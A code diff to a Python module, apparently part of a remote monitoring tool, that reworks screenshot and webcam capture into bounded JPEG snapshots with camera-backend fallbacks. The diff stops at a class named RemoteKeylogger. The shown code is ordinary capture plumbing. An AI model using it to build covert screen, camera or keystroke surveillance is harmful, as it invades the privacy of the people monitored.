@@ -9,7 +9,6 @@ from typing import Optional
 
 import cv2
 import mss
-import mss.tools
 import numpy as np
 from pynput import keyboard
 
@@ -76,29 +75,74 @@ class VisualIndicator:
                 pass
 
 
-def capture_primary_screen_png() -> bytes:
-    """Chụp ảnh màn hình đơn điểm."""
+def capture_primary_screen_jpeg(
+    jpeg_quality: int = 75, max_width: int = 1920
+) -> bytes:
+    """Capture one bounded-size screen snapshot encoded as JPEG."""
     try:
         with mss.mss() as screen_capture:
             primary_monitor = screen_capture.monitors[1]
             image = screen_capture.grab(primary_monitor)
-            return mss.tools.to_png(image.rgb, image.size)
+            # MSS returns BGRA; OpenCV encodes the first three channels as BGR.
+            frame = np.asarray(image, dtype=np.uint8)[:, :, :3]
+            return _encode_jpeg(frame, jpeg_quality, max_width, "screen snapshot")
     except mss.exception.ScreenShotError as exc:
         raise RuntimeError(f"Unable to capture primary screen: {exc}") from exc
 
 
 def capture_camera_frame(camera_index: int = 0):
-    """Chụp 1 khung hình từ Webcam."""
-    camera = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
+    """Capture one warmed-up camera frame, trying safe backend fallbacks."""
+    camera, frame = _open_working_camera(camera_index)
     try:
-        if not camera.isOpened():
-            raise RuntimeError(f"Unable to open camera {camera_index}")
-        success, frame = camera.read()
-        if not success or frame is None:
-            raise RuntimeError(f"Camera {camera_index} did not return a frame")
         return frame
     finally:
         camera.release()
+
+
+def capture_camera_jpeg(
+    camera_index: int = 0, jpeg_quality: int = 75, max_width: int = 1920
+) -> bytes:
+    """Capture one bounded-size, warmed-up camera snapshot as JPEG."""
+    frame = capture_camera_frame(camera_index)
+    return _encode_jpeg(frame, jpeg_quality, max_width, "webcam snapshot")
+
+
+def _camera_backends() -> list[int]:
+    if os.name == "nt":
+        candidates = [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY]
+    else:
+        candidates = [cv2.CAP_ANY]
+    # Some OpenCV builds map multiple constants to the same value.
+    return list(dict.fromkeys(candidates))
+
+
+def _read_camera_frame(camera, attempts: int = 10):
+    """Read through startup frames until the device returns a usable image."""
+    for _ in range(max(1, attempts)):
+        success, frame = camera.read()
+        if success and frame is not None:
+            return frame
+    return None
+
+
+def _open_working_camera(camera_index: int, fps: float = 30):
+    """Return the first backend that both opens and produces a real frame."""
+    for backend in _camera_backends():
+        camera = cv2.VideoCapture(camera_index, backend)
+        if not camera.isOpened():
+            camera.release()
+            continue
+
+        camera.set(cv2.CAP_PROP_BUFFERSIZE, 1)
+        camera.set(cv2.CAP_PROP_FPS, max(float(fps), 1.0))
+        frame = _read_camera_frame(camera)
+        if frame is not None:
+            return camera, frame
+        camera.release()
+
+    raise RuntimeError(
+        f"Unable to open camera {camera_index} with a backend that returns frames"
+    )
 
 
 class ScreenStreamCapture:
@@ -140,28 +184,19 @@ class CameraStreamCapture:
         jpeg_quality: int = 70,
         max_width: int = 1280,
     ) -> None:
-        backend = cv2.CAP_DSHOW if os.name == "nt" else cv2.CAP_ANY
-        self._camera = cv2.VideoCapture(camera_index, backend)
-        if not self._camera.isOpened():
-            self._camera.release()
-            raise RuntimeError(f"Unable to open camera {camera_index}")
-
         self.jpeg_quality = max(1, min(int(jpeg_quality), 100))
         self.max_width = max(0, int(max_width))
-        self._camera.set(cv2.CAP_PROP_BUFFERSIZE, 1)
-        self._camera.set(cv2.CAP_PROP_FPS, max(float(fps), 1.0))
+        self._camera, self._pending_frame = _open_working_camera(camera_index, fps)
 
     def read_jpeg(self) -> bytes:
-        success, frame = self._camera.read()
-        if not success or frame is None:
-            raise RuntimeError("Camera did not return a frame")
-        frame = _resize_to_max_width(frame, self.max_width)
-        success, encoded = cv2.imencode(
-            ".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, self.jpeg_quality]
-        )
-        if not success:
-            raise RuntimeError("Failed to encode webcam frame")
-        return encoded.tobytes()
+        if self._pending_frame is not None:
+            frame = self._pending_frame
+            self._pending_frame = None
+        else:
+            frame = _read_camera_frame(self._camera, attempts=1)
+            if frame is None:
+                raise RuntimeError("Camera did not return a frame")
+        return _encode_jpeg(frame, self.jpeg_quality, self.max_width, "webcam frame")
 
     def close(self) -> None:
         self._camera.release()
@@ -173,6 +208,19 @@ def _resize_to_max_width(frame: np.ndarray, max_width: int) -> np.ndarray:
     scale = max_width / frame.shape[1]
     target_size = (max_width, max(1, round(frame.shape[0] * scale)))
     return cv2.resize(frame, target_size, interpolation=cv2.INTER_AREA)
+
+
+def _encode_jpeg(
+    frame: np.ndarray, jpeg_quality: int, max_width: int, label: str
+) -> bytes:
+    quality = max(1, min(int(jpeg_quality), 100))
+    resized = _resize_to_max_width(frame, max(0, int(max_width)))
+    success, encoded = cv2.imencode(
+        ".jpg", resized, [cv2.IMWRITE_JPEG_QUALITY, quality]
+    )
+    if not success:
+        raise RuntimeError(f"Failed to encode {label}")
+    return encoded.tobytes()
 
 
 class RemoteKeylogger:
